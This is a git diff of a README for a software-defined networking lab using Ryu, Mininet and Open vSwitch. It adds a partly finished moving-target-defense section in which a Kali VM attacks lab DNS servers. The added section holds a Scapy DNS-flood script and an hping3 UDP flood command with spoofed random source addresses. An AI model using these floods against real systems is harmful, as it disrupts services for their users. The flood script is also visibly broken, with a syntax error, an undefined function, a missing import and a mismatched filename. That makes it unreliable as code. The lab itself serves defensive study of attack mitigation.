@@ -80,7 +80,6 @@ packet in 1 d6:cb:6b:ff:4b:94 33:33:ff:ff:4b:94 1
 packet in 1 96:ae:1a:c5:31:2e 33:33:ff:c5:31:2e 2
 packet in 1 d6:cb:6b:ff:4b:94 33:33:00:00:00:16 1
 packet in 1 d6:cb:6b:ff:4b:94 33:33:00:00:00:02 1
-
 ```
 This command starts Ryu with the Simple Switch application, which emulates a basic learning switch. The Ryu application will run in the foreground and print log messages to the console.
 
@@ -109,7 +108,6 @@ c0
 *** Starting 1 switches
 s1 ...
 *** Starting CLI:
-
 ```
 This command creates a simple Mininet network that includes a switch and a couple of hosts. The `--controller remote` option tells Mininet to use a remote controller (which is the Ryu instance we started earlier).
 
@@ -216,13 +214,10 @@ h1 -> h2 h3
 h2 -> h1 h3 
 h3 -> h1 h2 
 *** Results: 0% dropped (6/6 received)
-
 ```
 When implementing this in real-world, you might not use mininet, as you will be dealing wih real switches/controllers or virtualised switches/controllers. Switches/Controllers might be in a single node/machine or might be in two separate nodes/machines. 
 
 ```
-In an ubuntu 20.04 machine, do the following
-
 sudo apt install virt-manager 
 sudo apt install openvswitch-switch -y 
 
@@ -299,4 +294,118 @@ Explanation:
 del-flows is the ovs-ofctl command used to delete flows.
 br0 is the name of the OVS bridge from which the flows will be deleted.
 "cookie=1000/-1" is the match criteria for the flows to be deleted. In this case, it specifies that flows with a cookie value of 1000 will be deleted, regardless of the cookie mask (-1 means all bits are significant in the cookie).
-    
+
+
+## Focusing on Moving target Defense: 
+
+This is partially incomplete. I have to troubleshoot and analyse the working. 
+
+Please follow this paper published by Professor Dr.Abdullah Aydegar. Link for the paper: https://ieeexplore.ieee.org/document/9858278. This should explain what is Moving target defense and strategies. 
+
+I am explaining the concept in brief. Here, I have 2 VMs of Ubuntu, 1 switch, 1 controller and 1 VM of Kali Linux. 2 VM's are setup with DNS servers hosted locally. If you query a DNS request to these VM's, it should give you a DNS response ! 1 VM of Kali Linux acts as a Attacker machine. We will be using this to attack the 2 Ubuntu VM's. 
+
+### Moving Target Defense (MTD)
+
+It is a concept in cybersecurity that aims to increase the resilience of systems by dynamically changing the attack surface, making it more difficult for adversaries to exploit vulnerabilities. The idea is to constantly change the system's configuration, network parameters, or other elements to reduce the effectiveness of attacks.
+
+In this specific scenario with 2 VMs hosting DNS servers, Kali VM as an attacker, 1 switch, and 1 Ryu controller, here's how MTD can be applied:
+
+#### Architecture Overview:
+
+The two Ubuntu VMs running DNS servers are the potential targets of attack.
+The Kali VM acts as the attacker, attempting to compromise the DNS servers.
+The switch connects the VMs and facilitates the flow of network traffic.
+The Ryu controller is responsible for managing the network flow and implementing security measures.
+
+#### Ryu Controller's Role:
+The Ryu controller plays a crucial role in implementing the MTD concept. Its tasks include:
+
+Monitoring: The controller continuously monitors the network traffic and analyzes its characteristics.
+Detection: By employing various security mechanisms (such as intrusion detection systems or traffic anomaly detection), the controller identifies potential attacks or suspicious behavior targeting the DNS servers.
+Decision-making: Based on the detected threats, the Ryu controller makes decisions on how to dynamically respond and mitigate the attacks.
+Configuration: The controller reconfigures the network to redirect legitimate DNS traffic away from the targeted Ubuntu VM and towards another VM, enhancing resilience and ensuring uninterrupted service.
+
+#### Attack Detection and Response:
+When the Ryu controller detects an attack targeting one of the Ubuntu VMs running the DNS service, it initiates a response:
+
+Traffic Diversion: The controller reconfigures the switch to redirect legitimate DNS traffic to the unaffected Ubuntu VM running the DNS service. This ensures that legitimate requests are serviced by the operational VM, effectively isolating the targeted VM.
+Dynamic IP Address Assignment: The Ryu controller may dynamically assign a new IP address to the unaffected Ubuntu VM, further increasing the difficulty for the attacker to continue their exploitation attempts.
+
+You can create a python script that tells the controller to function based on the scenarios. My script isnt functioning as expected. 
+
+My RYU controller is present on the base Ubuntu machine. I am not using any VM for the controller. I have both my Ubuntu VM's running and ready to accept DNS requests and respond back. While, on the other hand, I have my Kali linux ready to attack / flood the two ubuntu VM's by DNS flooding.
+
+In Kali: Here for the attack, Initially I used Scapy for the attack. 
+
+This is my small python script that performs DNS flooding to the target Ubuntu VM.
+
+Create a new file:
+
+``` $ sudo nano dnsflood.py ```
+
+Copy and Paste the code to the file:
+
+```
+from scapy.all import *
+import random
+
+target_ip = input("Enter the IP address of the target: ")
+target_port = int(input("Enter the port number: ")
+
+# You can even hardcode the target_ip to 53, because thats where the DNS server is listening to.
+# target_port = 53
+
+packet_count = int(input("How many packets should i sent to flood the target? "))
+
+websites = ["www.google.com", "www.yahoo.com", "www.facebook.com", "www.fit.edu", "www.example.com"]
+
+for i in range(packet_count):
+    website = random.choice(websites)
+    packet = IP(dst=target_ip) / UDP(dport=target_port) / DNS(rd=1, qd=DNSQR(qname=website))
+    send(packet, verbose=False)
+
+for _ in range(packet_count):
+    threading.Thread(target=send_packet).start()
+```
+Run the python using this command: 
+
+``` $ sudo python3 dnspython.py ```
+
+This should be performing DNS flooding attack to the target VM.
+
+But, I did a little research and got to know about this tool called "hping3". I heard its super powerful. So, I gave it a try.
+
+``` $ sudo hping3 --udp -c 10000 -d 120 -p 53 --flood --rand-source 192.168.233.11 ```
+
+Yes, it is that simple and powerful than scapy. 
+
+Then, comes the main part. The Controller. You should create a python script that tells the controller to monitor for the traffic in the both Ubuntu VM's and mitigate the attack based on flow mentioned in the code. 
+
+I have attached the python script in the repo. Please try to use as an reference, as it would not work as expected. 
+
+``` $ sudo ryu-manager RYU4.py ```
+
+This is how the expected output should be:
+
+```
+loading app RYU4.py
+loading app ryu.controller.ofp_handler
+instantiating app RYU4.py of DNSController
+Initializing DNSController...
+instantiating app ryu.controller.ofp_handler of OFPHandler
+No attack detected.
+No attack detected.
+Received switch features event...
+No attack detected.
+No attack detected.
+No attack detected.
+```
+In this case, even though the attack is performed, the controller is not able to detect and mitigate it. That is where my flaw in the code lies on. 
+
+
+
+
+
+
+
+
